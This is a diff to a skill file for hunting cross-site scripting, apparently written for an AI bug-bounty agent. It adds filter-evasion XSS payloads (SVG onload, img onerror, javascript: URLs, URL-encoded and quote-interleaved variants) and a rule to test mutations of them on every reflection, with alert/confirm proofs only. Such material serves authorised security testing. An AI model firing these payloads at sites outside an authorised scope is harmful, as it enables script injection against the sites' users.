@@ -1,6 +1,6 @@
 ---
 name: hunt-xss
-description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
+description: "XSS: reflected, stored, DOM; prove execution. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible."
 sources: github, hackerone_public
 report_count: 174
 ---
@@ -18,6 +18,8 @@ Your payload must appear in the response body with angle brackets UNESCAPED. `<s
 1. **Inline script injection** (works when HTML context allows new tags):
    ```
    <script>alert(CANARY)</script>
+   1<!--><Svg/OnLoad=(confirm)(CANARY)-->
+   1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(CANARY)%3E
    ```
    Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.
 
@@ -31,6 +33,7 @@ Your payload must appear in the response body with angle brackets UNESCAPED. `<s
 3. **URL/href context:**
    ```
    javascript:alert(CANARY)
+   JavaScript:confirm`(CANARY)`
    ```
 
 **Distinguishing success from failure:**
@@ -175,6 +178,40 @@ $(location
 ---
 
 ## Payload & Detection Patterns
+
+**Expanded testing rule — do not stop at the built-in payloads.**  
+For every in-scope reflection or DOM sink, test the existing payloads **and** the additional set below. Treat this list as an additive corpus, not an exhaustive list: derive a small, context-specific set of variants from the observed parser context and filter behavior. Prioritize meaningful variations in tag/attribute case, separators, quote style, whitespace, comment boundaries, URL encoding, and JavaScript syntax. Do not blindly combine every mutation.
+
+Keep the exact submitted representation and the browser-parsed/decoded representation separate in your notes. Apply URL encoding only when required by the transport layer; do not repeatedly encode a payload or assume that percent-encoded text inside an HTML attribute will be decoded by the browser. For every candidate, verify the final DOM and actual execution in a current browser. Use harmless `confirm()`/`alert()` proofs only; do not turn a proof payload into credential, cookie, token, or data exfiltration.
+
+**Additional payload set — test alongside the existing corpus:**
+
+1. **JavaScript URL scheme with a template literal:**
+   ```text
+   JavaScript:confirm`K`
+   ```
+
+2. **Quote-interleaved, URL-encoded SVG event-handler payload:**
+   ```text
+   %27%3C%27s%27v%27g%27+o%27n%27l%27o%27a%27d%27=%27a%27l%27e%27r%27t%27(%277%27)%27+%27%3E%27
+   ```
+
+3. **URL-encoded SVG payload using a comment boundary and form-feed separator:**
+   ```text
+   1%3C!--%3E%3CSvg%0COnLoad=(confirm)(7110)--%3E
+   ```
+
+4. **URL-encoded script-closing and image error-handler payload with optional chaining:**
+   ```text
+   1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(1)%3E
+   ```
+
+5. **SVG event-handler payload with an HTML comment boundary:**
+   ```html
+   1<!--><Svg/OnLoad=(confirm)(1)-->
+   ```
+
+**Execution and canary handling:** These exact samples intentionally contain short proof values (`K`, `7`, `7110`, and `1`). Preserve and test the supplied forms as written, then create a separate unique-canary variant when recording a finding. A string merely appearing in the HTTP response is reflection, not confirmed XSS. Confirm that the browser parses the input into an executable element/attribute and that the harmless proof runs in the intended origin and context. If a variant is filtered, escaped, normalized, or blocked, record that result and move to the next context-appropriate variant rather than claiming success.
 
 **Basic context probing:**
 ```html
